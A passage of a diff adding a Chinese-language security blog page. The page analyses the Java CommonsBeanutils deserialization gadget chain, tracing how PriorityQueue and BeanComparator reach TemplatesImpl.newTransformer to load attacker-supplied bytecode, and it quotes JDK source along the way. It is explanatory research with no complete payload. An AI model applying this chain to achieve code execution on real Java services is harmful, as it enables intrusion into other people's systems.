+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>synchronized</span> Transformer <span style=color:#a6e22e>newTransformer</span><span style=color:#f92672>()</span>
+        <span style=color:#66d9ef>throws</span> TransformerConfigurationException
+    <span style=color:#f92672>{</span>
+        TransformerImpl transformer<span style=color:#f92672>;</span>
+
+        transformer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> TransformerImpl<span style=color:#f92672>(</span>getTransletInstance<span style=color:#f92672>(),</span> _outputProperties<span style=color:#f92672>,</span>
+            _indentNumber<span style=color:#f92672>,</span> _tfactory<span style=color:#f92672>);</span>
+
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_uriResolver <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            transformer<span style=color:#f92672>.</span><span style=color:#a6e22e>setURIResolver</span><span style=color:#f92672>(</span>_uriResolver<span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span>
+
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_tfactory<span style=color:#f92672>.</span><span style=color:#a6e22e>getFeature</span><span style=color:#f92672>(</span>XMLConstants<span style=color:#f92672>.</span><span style=color:#a6e22e>FEATURE_SECURE_PROCESSING</span><span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+            transformer<span style=color:#f92672>.</span><span style=color:#a6e22e>setSecureProcessing</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>return</span> transformer<span style=color:#f92672>;</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>newTransformer会调用getTransletInstance方法，在该方法内会调用defineTransletClasses方法，defineTransletClasses会读取_bytecodes并通过defineClass方法通过字节码加载成对应的类并构造对应的对象，所以这个过程会执行恶意类的构造方法。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java>    <span style=color:#66d9ef>private</span> Translet <span style=color:#a6e22e>getTransletInstance</span><span style=color:#f92672>()</span>
+        <span style=color:#66d9ef>throws</span> TransformerConfigurationException <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_name <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_class <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> defineTransletClasses<span style=color:#f92672>();</span>
+
+            <span style=color:#75715e>// The translet needs to keep a reference to all its auxiliary
+</span><span style=color:#75715e></span>            <span style=color:#75715e>// class to prevent the GC from collecting them
+</span><span style=color:#75715e></span>            AbstractTranslet translet <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>AbstractTranslet<span style=color:#f92672>)</span> _class<span style=color:#f92672>[</span>_transletIndex<span style=color:#f92672>].</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
+            translet<span style=color:#f92672>.</span><span style=color:#a6e22e>postInitialization</span><span style=color:#f92672>();</span>
+            translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setTemplates</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
+            translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setOverrideDefaultParser</span><span style=color:#f92672>(</span>_overrideDefaultParser<span style=color:#f92672>);</span>
+            translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setAllowedProtocols</span><span style=color:#f92672>(</span>_accessExternalStylesheet<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_auxClasses <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                translet<span style=color:#f92672>.</span><span style=color:#a6e22e>setAuxiliaryClasses</span><span style=color:#f92672>(</span>_auxClasses<span style=color:#f92672>);</span>
+            <span style=color:#f92672>}</span>
+
+            <span style=color:#66d9ef>return</span> translet<span style=color:#f92672>;</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InstantiationException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IllegalAccessException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+
+    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>defineTransletClasses</span><span style=color:#f92672>()</span>
+        <span style=color:#66d9ef>throws</span> TransformerConfigurationException <span style=color:#f92672>{</span>
+
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_bytecodes <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_TRANSLET_CLASS_ERR</span><span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+        <span style=color:#f92672>}</span>
+
+        TransletClassLoader loader <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>TransletClassLoader<span style=color:#f92672>)</span>
+            AccessController<span style=color:#f92672>.</span><span style=color:#a6e22e>doPrivileged</span><span style=color:#f92672>(</span><span style=color:#66d9ef>new</span> PrivilegedAction<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+                <span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>run</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
+                    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> TransletClassLoader<span style=color:#f92672>(</span>ObjectFactory<span style=color:#f92672>.</span><span style=color:#a6e22e>findClassLoader</span><span style=color:#f92672>(),</span>_tfactory<span style=color:#f92672>.</span><span style=color:#a6e22e>getExternalExtensionsMap</span><span style=color:#f92672>());</span>
+                <span style=color:#f92672>}</span>
+            <span style=color:#f92672>});</span>
+
+        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
+            <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>int</span> classCount <span style=color:#f92672>=</span> _bytecodes<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>;</span>
+            _class <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[</span>classCount<span style=color:#f92672>];</span>
+
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>classCount <span style=color:#f92672>&gt;</span> 1<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                _auxClasses <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;();</span>
+            <span style=color:#f92672>}</span>
+
+            <span style=color:#66d9ef>for</span> <span style=color:#f92672>(</span><span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0<span style=color:#f92672>;</span> i <span style=color:#f92672>&lt;</span> classCount<span style=color:#f92672>;</span> i<span style=color:#f92672>++)</span> <span style=color:#f92672>{</span>
+                _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> loader<span style=color:#f92672>.</span><span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span>_bytecodes<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+                <span style=color:#66d9ef>final</span> Class superClass <span style=color:#f92672>=</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getSuperclass</span><span style=color:#f92672>();</span>
+
+                <span style=color:#75715e>// Check if this is the main class
+</span><span style=color:#75715e></span>                <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>superClass<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>().</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>ABSTRACT_TRANSLET<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+                    _transletIndex <span style=color:#f92672>=</span> i<span style=color:#f92672>;</span>
+                <span style=color:#f92672>}</span>
+                <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+                    _auxClasses<span style=color:#f92672>.</span><span style=color:#a6e22e>put</span><span style=color:#f92672>(</span>_class<span style=color:#f92672>[</span>i<span style=color:#f92672>].</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> _class<span style=color:#f92672>[</span>i<span style=color:#f92672>]);</span>
+                <span style=color:#f92672>}</span>
+            <span style=color:#f92672>}</span>
+
+            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>_transletIndex <span style=color:#f92672>&lt;</span> 0<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+                ErrorMsg err<span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>NO_MAIN_TRANSLET_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>ClassFormatError e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_CLASS_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+        <span style=color:#f92672>}</span>
+        <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>LinkageError e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+            ErrorMsg err <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ErrorMsg<span style=color:#f92672>(</span>ErrorMsg<span style=color:#f92672>.</span><span style=color:#a6e22e>TRANSLET_OBJECT_ERR</span><span style=color:#f92672>,</span> _name<span style=color:#f92672>);</span>
+            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> TransformerConfigurationException<span style=color:#f92672>(</span>err<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>());</span>
+        <span style=color:#f92672>}</span>
+    <span style=color:#f92672>}</span>
+</code></pre></div><p>所以可以总结:<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的<code>_bytecodes</code>属性可以包含类的字节码，通过<code>newTransformer</code>方法可以调用字节码对应类的构造函数或者静态函数。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>TemplatesImpl</span> <span style=color:#66d9ef>implements</span> Templates<span style=color:#f92672>,</span> Serializable <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>long</span> serialVersionUID <span style=color:#f92672>=</span> 673094361519270707L<span style=color:#f92672>;</span>
+    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>static</span> String DESERIALIZE_TRANSLET <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jdk.xml.enableTemplatesImplDeserialization&#34;</span><span style=color:#f92672>;</span>
+
+    <span style=color:#75715e>/**
+</span><span style=color:#75715e>     * Name of the superclass of all translets. This is needed to     * determine which, among all classes comprising a translet,     * is the main one.     */</span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>static</span> String ABSTRACT_TRANSLET
+        <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&#34;</span><span style=color:#f92672>;</span>
+
+    <span style=color:#75715e>/**
+</span><span style=color:#75715e>     * Name of the main class or default name if unknown.     */</span>    <span style=color:#66d9ef>private</span> String _name <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+
+    <span style=color:#75715e>/**
+</span><span style=color:#75715e>     * Contains the actual class definition for the translet class and     * any auxiliary classes.     */</span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[][]</span> _bytecodes <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
+</code></pre></div><p>总结一下过程：PriorityQueue对象在反序列化过程中会触发排序，调用comparator.compare，在BeanComparator.compare方法中会尝试获取类的property对应的成员的值，其方法是通过尝试获取成员值对应的getter方法，而后调用这个getter方法。</p>
+<p>而TemplatesImpl类的_bytecodes可以存储字节码并且可以通过newTransformer方法调用这个字节码对应类的构造函数或者静态方法，TemplatesImpl类的getOutputProperties方法会调用newTransformer方法。</p>
+<p>而getOutputProperties在规范中对应于outputProperties的getter方法，最终构成反序列化链。</p>
+<p><strong>参考链接</strong></p>
+<blockquote>
+<p>
+<a href=https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html target=_blank>https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html</a></p>
+</blockquote>
+<p>创建于2024-01-11</p>
+<p><strong>Created at 2024-01-12T14:32:08+08:00</strong></p>
+<div class=last_mod>
+创建于:Friday, January 12,2024
+</div>
+<div class=last_mod>
+最后修改于: Friday, January 12,2024
+</div>
+<div class=article-container></div>
+<script src=https://utteranc.es/client.js repo=CppXL/blog_comment issue-term=pathname theme=github-light crossorigin=anonymous async></script>
+</div>
+<div id=comments>
+</div>
+<footer class=footline>
+</footer>
+</div>
+</div>
+<div id=navigation>
+<a class="nav nav-prev" href=/zh-cn/research/web/java-deserialization/ title="Java Deserialization"> <i class="fa fa-chevron-left"></i></a>
+<a class="nav nav-next" href=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" style=margin-right:0><i class="fa fa-chevron-right"></i></a>
+</div>
+</section>
+<div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px>
+<div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div>
+</div>
+<script src=/js/clipboard.min.js?1706695571></script>
+<script src=/js/perfect-scrollbar.min.js?1706695571></script>
+<script src=/js/perfect-scrollbar.jquery.min.js?1706695571></script>
+<script src=/js/jquery.sticky.js?1706695571></script>
+<script src=/js/featherlight.min.js?1706695571></script>
+<script src=/js/highlight.pack.js?1706695571></script>
+<script>hljs.initHighlightingOnLoad()</script>
+<script src=/js/modernizr.custom-3.6.0.js?1706695571></script>
+<script src=/js/learn.js?1706695571></script>
+<script src=/js/hugo-learn.js?1706695571></script>
+<script src=/mermaid/mermaid.js?1706695571></script>
+<script>mermaid.initialize({startOnLoad:!0})</script>
+<script>(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)})(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-105947713-1','auto'),ga('send','pageview')</script>
+</body>
+</html>
